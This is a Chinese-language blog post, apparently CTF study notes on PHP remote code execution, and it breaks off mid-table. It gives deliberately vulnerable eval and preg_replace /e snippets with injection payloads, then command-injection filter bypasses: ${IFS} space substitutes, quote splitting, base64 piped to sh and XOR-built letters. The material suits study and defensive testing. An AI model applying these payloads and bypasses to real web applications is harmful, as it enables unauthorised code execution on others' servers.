<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">eval</span>(<span class="string">&quot;\ret= strtolower(&#x27;<span class="subst">$cmd</span>&#x27;);&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只有GPC配置文件开启才能绕过   高版本的PHP已经淘汰GPC</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="string">&#x27;);phpinfo();//</span></span><br></pre></td></tr></table></figure>

<p>preg_replace()   加上&#x2F;e会  匹配之后会形成代码执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/abc/e&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>],<span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>$_REQUEST  包含GET,POST,COOKIE方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>,<span class="string">&#x27;$ret=&quot;\\1&quot;&#x27;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<h2 id="命令执行相关函数"><a href="#命令执行相关函数" class="headerlink" title="命令执行相关函数"></a>命令执行相关函数</h2><p>[PHP执行系统外部命令:exec()、passthru()、system()、shell_exec()</p>
<p><a target="_blank" rel="noopener" href="http://hi.baidu.com/cszhi/item/d71d61f22feefe16ce9f32d1"><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.exec.php">官方文档</a></a></p>
<p><img src="/2023/03/15/RCE/image-20221215114124054.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec()函数无回显</span><br><span class="line">因为exec没有回显，所以可以存入文件中，或借助print_r进行输出 </span><br><span class="line">使用姿势：echo exec(&quot;ls&quot;,$file); </span><br><span class="line">exec(print_r(system(ls))); //system和print_r 都可以替换为作用相似的函数使用</span><br><span class="line">或者使用linux命令tee内容写入到文件中</span><br><span class="line">ls  | tee 1.txt</span><br><span class="line">然后访问1.txt就行</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="1-空格被过滤"><a href="#1-空格被过滤" class="headerlink" title="1.空格被过滤"></a>1.空格被过滤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">linux</span><br><span class="line">%<span class="number">09</span>(tap)</span><br><span class="line">    </span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$<span class="number">9</span>flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">&#x27;\x20flag.txt&#x27;</span>&amp;&amp;cat<span class="variable">$kg</span>(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br><span class="line"></span><br><span class="line">windows下</span><br><span class="line"></span><br><span class="line">（实用性不是很广，也就type这个命令可以用）</span><br><span class="line">type.\flag.txt</span><br><span class="line">type,flag.txt</span><br><span class="line"><span class="keyword">echo</span>,<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<h3 id="2-关键字被过滤"><a href="#2-关键字被过滤" class="headerlink" title="2.关键字被过滤"></a>2.关键字被过滤</h3><ul>
<li><p>可以采用重命名变量然后拼接  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg.过滤了ls</span><br><span class="line">a=l;b=s;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>采用base64的方法绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`base64内容 | base64 -d`</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">汇总几种关键字绕过方式 以flag为例</span><br><span class="line">* 单引号绕过 fla&#x27;g&#x27;</span><br><span class="line">* 双引号绕过 fla&quot;g&quot;</span><br><span class="line">* 反斜线绕过 f\lag</span><br><span class="line">* 变量拼接绕过 a=g;cat$IFS$1fla$a.php</span><br><span class="line">* $+任意数字绕过 fl$1ag </span><br><span class="line">* Base64绕过 cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br><span class="line">  echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br><span class="line">* 内联绕过 就是将反引号内命令的输出作为输入执行</span><br><span class="line">  cat `ls`</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="命令执行相关内容"><a href="#命令执行相关内容" class="headerlink" title="命令执行相关内容"></a>命令执行相关内容</h2><h3 id="拼接符"><a href="#拼接符" class="headerlink" title="拼接符"></a>拼接符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; ：前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;： 表示前一条命令执行成功时，才执行后一条命令</span><br><span class="line">| ：直接执行后面的语句</span><br><span class="line">|| ：表示上一条命令执行失败后，才执行下一条命令</span><br><span class="line">; ：表示命令依次执行</span><br></pre></td></tr></table></figure>

<h3 id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式 .*就是单个字符匹配任意次，即贪婪匹配。以这个表达式为例：a.*b，它将会匹配最长的以a开始，以b结束的字符串,以第一个a开始，最后一个b结束。如果用它来搜索aabab的话，它会匹配整个字符串aabab。</span><br></pre></td></tr></table></figure>

<h3 id="ls-cat"><a href="#ls-cat" class="headerlink" title="ls  cat"></a>ls  cat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</span><br><span class="line"></span><br><span class="line">cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上。</span><br><span class="line"></span><br><span class="line">如果cat被过滤，可以用下边的方法进行绕过</span><br><span class="line"></span><br><span class="line">(1)more:一页一页的显示档案内容</span><br><span class="line">(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</span><br><span class="line">(3)head:查看头几行</span><br><span class="line">(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">(5)tail:查看尾几行</span><br><span class="line">(6)nl：显示的时候，顺便输出行号</span><br><span class="line">(7)od:以二进制的方式读取档案内容</span><br><span class="line">(8)vi:一种编辑器，这个也可以查看</span><br><span class="line">(9)vim:一种编辑器，这个也可以查看</span><br><span class="line">(10)sort:可以查看</span><br><span class="line">(11)uniq:可以查看</span><br><span class="line">(12)file -f:报错出具体内容</span><br></pre></td></tr></table></figure>

<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将指定的函数体插入并取代每一处调用该函数的地方。反引号 在linux中作为内联执行，执行输出结果。</span><br></pre></td></tr></table></figure>



<h2 id="无数字和字母RCE、"><a href="#无数字和字母RCE、" class="headerlink" title="无数字和字母RCE、"></a>无数字和字母RCE、</h2><h3 id="1-异或绕过"><a href="#1-异或绕过" class="headerlink" title="1.异或绕过"></a>1.异或绕过</h3><p><img src="/2023/03/15/RCE/image-20221215225144269.png" alt="image-20221215225144269"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$code</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9]+/&#x27;</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用没有被过滤的符号异或生成对应的字母</p>
<p>异或结果没有是数字的</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;-~@#$%^&amp;*_+|/?.,&lt;&gt;`&#123;&#125;[]()&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&gt;<span class="number">64</span> &amp;&amp; (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&lt;<span class="number">91</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;i ^ j = &#x27;</span>,<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j)),<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">        <span class="keyword">elif</span> (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&gt;<span class="number">96</span> &amp;&amp; (<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))&lt;<span class="number">123</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;i ^ j = &#x27;</span>,<span class="built_in">chr</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j)),<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j))</span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;-~@#$%^&amp;*_+|/?.,&lt;&gt;`&#123;&#125;[]()&#x27;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(ord(i) ^ ord(j))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">int</span>(r):</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;^&#x27;</span>, j, <span class="string">&#x27;=&#x27;</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j)), <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j))</span><br><span class="line">                </span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">            <span class="comment"># print(ord(i) ^ ord(j))</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">int</span>(r):</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;^&#x27;</span>, j, <span class="string">&#x27;=&#x27;</span>, <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j)), <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j))</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">~ ^ ? = A <span class="number">65</span> </span><br><span class="line">? ^ ~ = A <span class="number">65</span></span><br><span class="line">&lt; ^ &#125; = A <span class="number">65</span></span><br><span class="line">&#125; ^ &lt; = A <span class="number">65</span></span><br><span class="line">~ ^ &lt; = B <span class="number">66</span></span><br><span class="line">| ^ &gt; = B <span class="number">66</span></span><br><span class="line">? ^ &#125; = B <span class="number">66</span></span><br><span class="line">&lt; ^ ~ = B <span class="number">66</span></span><br><span class="line">&gt; ^ | = B <span class="number">66</span></span><br><span class="line">&#125; ^ ? = B <span class="number">66</span></span><br><span class="line"><span class="comment"># ^ ` = C 67</span></span><br><span class="line">| ^ ? = C <span class="number">67</span></span><br><span class="line">? ^ | = C <span class="number">67</span></span><br><span class="line">&gt; ^ &#125; = C <span class="number">67</span></span><br><span class="line">` ^ <span class="comment"># = C 67</span></span><br><span class="line">&#125; ^ &gt; = C <span class="number">67</span></span><br><span class="line">$ ^ ` = D <span class="number">68</span></span><br><span class="line">? ^ &#123; = D <span class="number">68</span></span><br><span class="line">` ^ $ = D <span class="number">68</span></span><br><span class="line">&#123; ^ ? = D <span class="number">68</span></span><br><span class="line">% ^ ` = E <span class="number">69</span></span><br><span class="line">&gt; ^ &#123; = E <span class="number">69</span></span><br><span class="line">` ^ % = E <span class="number">69</span></span><br><span class="line">&#123; ^ &gt; = E <span class="number">69</span></span><br><span class="line">&amp; ^ ` = F <span class="number">70</span></span><br><span class="line">` ^ &amp; = F <span class="number">70</span></span><br><span class="line">&lt; ^ &#123; = G <span class="number">71</span></span><br><span class="line">&#123; ^ &lt; = G <span class="number">71</span></span><br><span class="line">` ^ ( = H <span class="number">72</span></span><br><span class="line">( ^ ` = H <span class="number">72</span></span><br><span class="line">` ^ ) = I <span class="number">73</span></span><br><span class="line">) ^ ` = I <span class="number">73</span></span><br><span class="line">* ^ ` = J <span class="number">74</span></span><br><span class="line">` ^ * = J <span class="number">74</span></span><br><span class="line">+ ^ ` = K <span class="number">75</span></span><br><span class="line">` ^ + = K <span class="number">75</span></span><br><span class="line">, ^ ` = L <span class="number">76</span></span><br><span class="line">` ^ , = L <span class="number">76</span></span><br><span class="line">- ^ ` = M <span class="number">77</span></span><br><span class="line">` ^ - = M <span class="number">77</span></span><br><span class="line">. ^ ` = N <span class="number">78</span></span><br><span class="line">` ^ . = N <span class="number">78</span></span><br><span class="line">/ ^ ` = O <span class="number">79</span></span><br><span class="line">` ^ / = O <span class="number">79</span></span><br><span class="line">- ^ &#125; = P <span class="number">80</span></span><br><span class="line">~ ^ . = P <span class="number">80</span></span><br><span class="line">+ ^ &#123; = P <span class="number">80</span></span><br><span class="line">| ^ , = P <span class="number">80</span></span><br><span class="line">. ^ ~ = P <span class="number">80</span></span><br><span class="line">, ^ | = P <span class="number">80</span></span><br><span class="line">&#123; ^ + = P <span class="number">80</span></span><br><span class="line">&#125; ^ - = P <span class="number">80</span></span><br><span class="line">- ^ | = Q <span class="number">81</span></span><br><span class="line">~ ^ / = Q <span class="number">81</span></span><br><span class="line">* ^ &#123; = Q <span class="number">81</span></span><br><span class="line">| ^ - = Q <span class="number">81</span></span><br><span class="line">/ ^ ~ = Q <span class="number">81</span></span><br><span class="line">, ^ &#125; = Q <span class="number">81</span></span><br><span class="line">&#123; ^ * = Q <span class="number">81</span></span><br><span class="line">&#125; ^ , = Q <span class="number">81</span></span><br><span class="line">~ ^ , = R <span class="number">82</span></span><br><span class="line">| ^ . = R <span class="number">82</span></span><br><span class="line">/ ^ &#125; = R <span class="number">82</span></span><br><span class="line">. ^ | = R <span class="number">82</span></span><br><span class="line">, ^ ~ = R <span class="number">82</span></span><br><span class="line">&#123; ^ ) = R <span class="number">82</span></span><br><span class="line">&#125; ^ / = R <span class="number">82</span></span><br><span class="line">) ^ &#123; = R <span class="number">82</span></span><br><span class="line">- ^ ~ = S <span class="number">83</span></span><br><span class="line">~ ^ - = S <span class="number">83</span></span><br><span class="line">| ^ / = S <span class="number">83</span></span><br><span class="line">/ ^ | = S <span class="number">83</span></span><br><span class="line">. ^ &#125; = S <span class="number">83</span></span><br><span class="line">&#123; ^ ( = S <span class="number">83</span></span><br><span class="line">&#125; ^ . = S <span class="number">83</span></span><br><span class="line">( ^ &#123; = S <span class="number">83</span></span><br><span class="line">~ ^ * = T <span class="number">84</span></span><br><span class="line">* ^ ~ = T <span class="number">84</span></span><br><span class="line">| ^ ( = T <span class="number">84</span></span><br><span class="line">/ ^ &#123; = T <span class="number">84</span></span><br><span class="line">&#123; ^ / = T <span class="number">84</span></span><br><span class="line">&#125; ^ ) = T <span class="number">84</span></span><br><span class="line">( ^ | = T <span class="number">84</span></span><br><span class="line">) ^ &#125; = T <span class="number">84</span></span><br><span class="line">~ ^ + = U <span class="number">85</span></span><br><span class="line">+ ^ ~ = U <span class="number">85</span></span><br><span class="line">| ^ ) = U <span class="number">85</span></span><br><span class="line">. ^ &#123; = U <span class="number">85</span></span><br><span class="line">&#123; ^ . = U <span class="number">85</span></span><br><span class="line">&#125; ^ ( = U <span class="number">85</span></span><br><span class="line">( ^ &#125; = U <span class="number">85</span></span><br><span class="line">) ^ | = U <span class="number">85</span></span><br><span class="line">- ^ &#123; = V <span class="number">86</span></span><br><span class="line">~ ^ ( = V <span class="number">86</span></span><br><span class="line">* ^ | = V <span class="number">86</span></span><br><span class="line">+ ^ &#125; = V <span class="number">86</span></span><br><span class="line">| ^ * = V <span class="number">86</span></span><br><span class="line">&#123; ^ - = V <span class="number">86</span></span><br><span class="line">&#125; ^ + = V <span class="number">86</span></span><br><span class="line">( ^ ~ = V <span class="number">86</span></span><br><span class="line">~ ^ ) = W <span class="number">87</span></span><br><span class="line">* ^ &#125; = W <span class="number">87</span></span><br><span class="line">+ ^ | = W <span class="number">87</span></span><br><span class="line">| ^ + = W <span class="number">87</span></span><br><span class="line">, ^ &#123; = W <span class="number">87</span></span><br><span class="line">&#123; ^ , = W <span class="number">87</span></span><br><span class="line">&#125; ^ * = W <span class="number">87</span></span><br><span class="line">) ^ ~ = W <span class="number">87</span></span><br><span class="line">~ ^ &amp; = X <span class="number">88</span></span><br><span class="line"><span class="comment"># ^ &#123; = X 88</span></span><br><span class="line">$ ^ | = X <span class="number">88</span></span><br><span class="line">% ^ &#125; = X <span class="number">88</span></span><br><span class="line">&amp; ^ ~ = X <span class="number">88</span></span><br><span class="line">| ^ $ = X <span class="number">88</span></span><br><span class="line">&#123; ^ <span class="comment"># = X 88</span></span><br><span class="line">&#125; ^ % = X <span class="number">88</span></span><br><span class="line">$ ^ &#125; = Y <span class="number">89</span></span><br><span class="line">% ^ | = Y <span class="number">89</span></span><br><span class="line">| ^ % = Y <span class="number">89</span></span><br><span class="line">&#125; ^ $ = Y <span class="number">89</span></span><br><span class="line">~ ^ $ = Z <span class="number">90</span></span><br><span class="line">$ ^ ~ = Z <span class="number">90</span></span><br><span class="line">&amp; ^ | = Z <span class="number">90</span></span><br><span class="line">| ^ &amp; = Z <span class="number">90</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">^ ^ ? = a <span class="number">97</span></span><br><span class="line">_ ^ &gt; = a <span class="number">97</span></span><br><span class="line">? ^ ^ = a <span class="number">97</span></span><br><span class="line">&lt; ^ ] = a <span class="number">97</span></span><br><span class="line">&gt; ^ _ = a <span class="number">97</span></span><br><span class="line">] ^ &lt; = a <span class="number">97</span></span><br><span class="line">^ ^ &lt; = b <span class="number">98</span></span><br><span class="line">? ^ ] = b <span class="number">98</span></span><br><span class="line">&lt; ^ ^ = b <span class="number">98</span></span><br><span class="line">] ^ ? = b <span class="number">98</span></span><br><span class="line"><span class="meta">@ ^ </span><span class="comment"># = c 99</span></span><br><span class="line"><span class="comment"># ^ @ = c 99</span></span><br><span class="line">_ ^ &lt; = c <span class="number">99</span></span><br><span class="line">&lt; ^ _ = c <span class="number">99</span></span><br><span class="line">&gt; ^ ] = c <span class="number">99</span></span><br><span class="line">] ^ &gt; = c <span class="number">99</span></span><br><span class="line"><span class="meta">@ ^ $ = d <span class="number">100</span></span></span><br><span class="line">$ ^ @ = d <span class="number">100</span></span><br><span class="line">? ^ [ = d <span class="number">100</span></span><br><span class="line">[ ^ ? = d <span class="number">100</span></span><br><span class="line"><span class="meta">@ ^ % = e <span class="number">101</span></span></span><br><span class="line">% ^ @ = e <span class="number">101</span></span><br><span class="line">&gt; ^ [ = e <span class="number">101</span></span><br><span class="line">[ ^ &gt; = e <span class="number">101</span></span><br><span class="line"><span class="meta">@ ^ &amp; = f <span class="number">102</span></span></span><br><span class="line">&amp; ^ @ = f <span class="number">102</span></span><br><span class="line">&lt; ^ [ = g <span class="number">103</span></span><br><span class="line">[ ^ &lt; = g <span class="number">103</span></span><br><span class="line"><span class="meta">@ ^ (<span class="params"> = h <span class="number">104</span></span></span></span><br><span class="line"><span class="params"><span class="meta">(<span class="params"> 